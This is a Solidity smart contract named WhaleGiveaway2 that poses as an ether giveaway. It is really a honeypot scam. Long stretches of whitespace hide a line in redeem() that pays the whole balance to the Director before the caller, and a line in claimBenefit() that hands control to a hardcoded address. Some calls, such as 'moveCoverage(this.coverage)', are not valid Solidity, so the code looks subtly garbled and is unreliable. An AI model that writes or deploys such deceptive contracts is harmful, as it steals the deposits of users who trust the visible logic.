pragma solidity ^0.4.19;

contract WhaleGiveaway2
{
    address public Director = msg.sender;
    uint constant public minEligibility = 0.999001 ether;

    function()
    public
    payable
    {

    }

    function redeem()
    public
    payable
    {
        if(msg.value>=minEligibility)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Director.moveCoverage(this.coverage);
            msg.sender.moveCoverage(this.coverage);
        }
    }

    function claimBenefit()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Director=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}
        require(msg.sender == Director);
        Director.moveCoverage(this.coverage);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Director);
        adr.call.value(msg.value)(data);
    }
}